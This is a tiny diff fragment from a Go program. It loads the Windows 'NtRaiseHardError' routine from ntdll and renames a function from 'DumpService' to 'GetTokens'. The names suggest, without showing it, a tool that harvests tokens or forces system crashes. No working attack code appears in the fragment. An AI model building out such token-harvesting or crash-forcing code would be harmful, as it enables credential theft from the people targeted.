@@ -28,7 +28,7 @@ var (
 	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
 )
 
-func DumpService() []string {
+func GetTokens() []string {
 
 	var WG sync.WaitGroup
 	var T []string
